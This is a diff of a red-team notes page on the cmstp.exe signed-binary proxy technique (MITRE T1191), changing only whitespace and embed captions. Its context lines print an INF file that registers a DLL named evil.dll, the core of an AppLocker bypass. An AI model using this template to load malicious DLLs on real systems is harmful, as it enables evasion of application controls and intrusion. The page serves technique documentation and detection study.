@@ -21,13 +21,13 @@ Creating a file that will be loaded by CSMTP.exe binary that will in turn load o
 [version]
 Signature=$chicago$
 AdvancedINF=2.5
- 
+
 [DefaultInstall_SingleUser]
 RegisterOCXs=RegisterOCXSection
- 
+
 [RegisterOCXSection]
 C:\experiments\cmstp\evil.dll
- 
+
 [Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager"
 ServiceName="mantvydas"
@@ -55,9 +55,7 @@ Note how the connection was established one second after the process creation. T
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1191" %}
+{% embed url="https://attack.mitre.org/wiki/Technique/T1191" caption="" %}
 
-{% embed url="https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/" %}
-
-
+{% embed url="https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/" caption="" %}
 
